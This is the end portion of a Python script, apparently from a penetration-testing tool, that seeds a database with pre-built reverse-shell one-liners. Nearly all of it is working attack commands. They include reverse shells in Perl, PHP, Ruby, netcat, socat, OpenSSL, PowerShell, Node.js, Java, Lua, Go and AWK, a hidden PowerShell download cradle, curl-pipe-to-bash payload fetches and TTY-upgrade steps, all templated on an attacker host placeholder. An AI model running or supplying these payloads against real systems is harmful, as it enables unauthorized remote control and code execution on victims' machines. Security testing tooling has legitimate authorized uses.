            "description": "Perl reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "perl",
            "name": "Perl Reverse Shell (No sh)",
            "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{{LHOST}}:{{LPORT}}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
            "description": "Perl reverse shell without /bin/sh",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # PHP
        {
            "category": "reverse_shells",
            "subcategory": "php",
            "name": "PHP Reverse Shell",
            "command": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "description": "PHP reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "php",
            "name": "PHP Reverse Shell (proc_open)",
            "command": "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
            "description": "PHP reverse shell using proc_open",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Ruby
        {
            "category": "reverse_shells",
            "subcategory": "ruby",
            "name": "Ruby Reverse Shell",
            "command": "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "description": "Ruby reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "ruby",
            "name": "Ruby Reverse Shell (No sh)",
            "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{{LHOST}}\",{{LPORT}});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            "description": "Ruby reverse shell without /bin/sh",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Netcat
        {
            "category": "reverse_shells",
            "subcategory": "netcat",
            "name": "Netcat Traditional",
            "command": "nc -e /bin/sh {{LHOST}} {{LPORT}}",
            "description": "Netcat reverse shell (requires -e option)",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "netcat",
            "name": "Netcat OpenBSD (mkfifo)",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f",
            "description": "Netcat reverse shell using named pipe (OpenBSD nc)",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "netcat",
            "name": "Netcat BusyBox",
            "command": "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f",
            "description": "Netcat reverse shell for BusyBox (mknod)",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Socat
        {
            "category": "reverse_shells",
            "subcategory": "socat",
            "name": "Socat Reverse Shell",
            "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}",
            "description": "Socat reverse shell with full TTY",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "socat",
            "name": "Socat Listener (for full TTY)",
            "command": "socat file:`tty`,raw,echo=0 TCP-L:{{LPORT}}",
            "description": "Socat listener for full TTY reverse shell",
            "variables": '[{"name": "LPORT", "default": "4444"}]'
        },

        # OpenSSL
        {
            "category": "reverse_shells",
            "subcategory": "openssl",
            "name": "OpenSSL Reverse Shell",
            "command": "mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {{LHOST}}:{{LPORT}} > /tmp/s; rm /tmp/s",
            "description": "Encrypted reverse shell using OpenSSL",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "openssl",
            "name": "OpenSSL Listener",
            "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port {{LPORT}}",
            "description": "OpenSSL listener for encrypted reverse shell",
            "variables": '[{"name": "LPORT", "default": "4444"}]'
        },

        # PowerShell
        {
            "category": "reverse_shells",
            "subcategory": "powershell",
            "name": "PowerShell Reverse Shell",
            "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "description": "PowerShell reverse shell for Windows",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "powershell",
            "name": "PowerShell Reverse Shell (Base64)",
            "command": "powershell -e {{BASE64_PAYLOAD}}",
            "description": "PowerShell reverse shell using Base64 encoded payload",
            "variables": '[{"name": "BASE64_PAYLOAD", "default": ""}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "powershell",
            "name": "PowerShell IEX Download Cradle",
            "command": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://{{LHOST}}/shell.ps1')\"",
            "description": "PowerShell download and execute reverse shell script",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
        },

        # Node.js
        {
            "category": "reverse_shells",
            "subcategory": "nodejs",
            "name": "Node.js Reverse Shell",
            "command": "require('child_process').exec('nc -e /bin/sh {{LHOST}} {{LPORT}}')",
            "description": "Node.js reverse shell using child_process",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "nodejs",
            "name": "Node.js Reverse Shell (Full)",
            "command": "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect({{LPORT}},'{{LHOST}}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();",
            "description": "Node.js reverse shell without nc dependency",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Java
        {
            "category": "reverse_shells",
            "subcategory": "java",
            "name": "Java Reverse Shell (Runtime)",
            "command": "Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done'\"); p.waitFor();",
            "description": "Java reverse shell using Runtime.exec()",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Lua
        {
            "category": "reverse_shells",
            "subcategory": "lua",
            "name": "Lua Reverse Shell",
            "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{{LHOST}}','{{LPORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            "description": "Lua reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Golang
        {
            "category": "reverse_shells",
            "subcategory": "golang",
            "name": "Go Reverse Shell",
            "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{{LHOST}}:{{LPORT}}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
            "description": "Go reverse shell (compile and run)",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # AWK
        {
            "category": "reverse_shells",
            "subcategory": "awk",
            "name": "AWK Reverse Shell",
            "command": "awk 'BEGIN {s = \"/inet/tcp/0/{{LHOST}}/{{LPORT}}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
            "description": "AWK reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },

        # Curl-based delivery
        {
            "category": "reverse_shells",
            "subcategory": "curl",
            "name": "Curl Bash Reverse Shell",
            "command": "curl http://{{LHOST}}/shell.sh | bash",
            "description": "Download and execute bash reverse shell script",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
        },
        {
            "category": "reverse_shells",
            "subcategory": "curl",
            "name": "Curl Python Reverse Shell",
            "command": "curl http://{{LHOST}}/shell.py | python",
            "description": "Download and execute Python reverse shell",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}]'
        },

        # ==================== SHELL UPGRADES ====================
        {
            "category": "shell_upgrades",
            "subcategory": "python",
            "name": "Python PTY Upgrade",
            "command": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "description": "Upgrade to interactive PTY shell using Python",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "python",
            "name": "Python3 PTY Upgrade",
            "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "description": "Upgrade to interactive PTY shell using Python3",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "script",
            "name": "Script TTY Upgrade",
            "command": "/usr/bin/script -qc /bin/bash /dev/null",
            "description": "Upgrade to TTY shell using script command",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "socat",
            "name": "Socat Full TTY",
            "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{LHOST}}:{{LPORT}}",
            "description": "Full TTY reverse shell using socat",
            "variables": '[{"name": "LHOST", "default": "10.0.0.1"}, {"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "shell_upgrades",
            "subcategory": "stty",
            "name": "Full TTY Upgrade (Background Method)",
            "command": "# In reverse shell:\\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\\n# Press Ctrl+Z to background\\n# In your terminal:\\nstty raw -echo; fg\\n# Press Enter twice\\nexport TERM=xterm-256color\\nexport SHELL=bash\\nstty rows 38 columns 116",
            "description": "Complete TTY upgrade with job control and proper terminal",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "stty",
            "name": "STTY Raw Mode",
            "command": "stty raw -echo; fg",
            "description": "Set terminal to raw mode after backgrounding shell (Ctrl+Z)",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "export",
            "name": "Export Terminal Variables",
            "command": "export TERM=xterm-256color; export SHELL=/bin/bash; export HOME=/root",
            "description": "Set environment variables for proper terminal behavior",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "stty",
            "name": "Set Terminal Size",
            "command": "stty rows {{ROWS}} columns {{COLS}}",
            "description": "Set terminal dimensions (match your local terminal)",
            "variables": '[{"name": "ROWS", "default": "38"}, {"name": "COLS", "default": "116"}]'
        },
        {
            "category": "shell_upgrades",
            "subcategory": "perl",
            "name": "Perl PTY Upgrade",
            "command": "perl -e 'exec \"/bin/bash\"'",
            "description": "Upgrade shell using Perl",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "expect",
            "name": "Expect Shell Upgrade",
            "command": "expect -c 'spawn /bin/bash; interact'",
            "description": "Upgrade to interactive shell using expect",
            "variables": "[]"
        },
        {
            "category": "shell_upgrades",
            "subcategory": "rlwrap",
            "name": "Rlwrap Listener (Arrow Keys)",
            "command": "rlwrap nc -lvnp {{LPORT}}",
            "description": "Netcat listener with readline support (arrow keys, history)",
            "variables": '[{"name": "LPORT", "default": "4444"}]'
        },
        {
            "category": "shell_upgrades",
            "subcategory": "reset",
            "name": "Reset Terminal",
            "command": "reset",
            "description": "Reset terminal after TTY upgrade",
            "variables": "[]"
        }
    ]

    for oneliner in prebuilt_oneliners:
        cursor.execute('''
            INSERT INTO shell_oneliners (category, subcategory, name, command, description, variables, is_admin)
            VALUES (?, ?, ?, ?, ?, ?, 1)
        ''', (oneliner['category'], oneliner['subcategory'], oneliner['name'],
              oneliner['command'], oneliner['description'], oneliner['variables']))

    conn.commit()
    conn.close()
    print(f"Seeded {len(prebuilt_oneliners)} pre-built shell one-liners")


if __name__ == '__main__':
    init_db()
